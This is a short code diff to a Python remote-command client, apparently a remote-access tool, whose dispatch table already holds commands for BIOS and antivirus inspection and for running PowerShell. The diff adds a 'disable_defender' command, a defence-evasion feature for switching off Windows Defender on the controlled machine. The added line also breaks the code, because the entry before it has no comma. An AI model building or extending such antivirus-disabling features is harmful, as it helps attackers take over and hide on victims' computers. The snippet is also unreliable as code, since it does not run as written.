@@ -60,6 +60,7 @@ class Client:
             "get_bios":self.get_bios,
             "get_antivirus":self.get_antivirus,
             "get_active": self.get_active
+            "disable_defender": self.disable_defender
         }
 
     def run_powershell_command(self, command: str, print_result: bool = True) -> None:
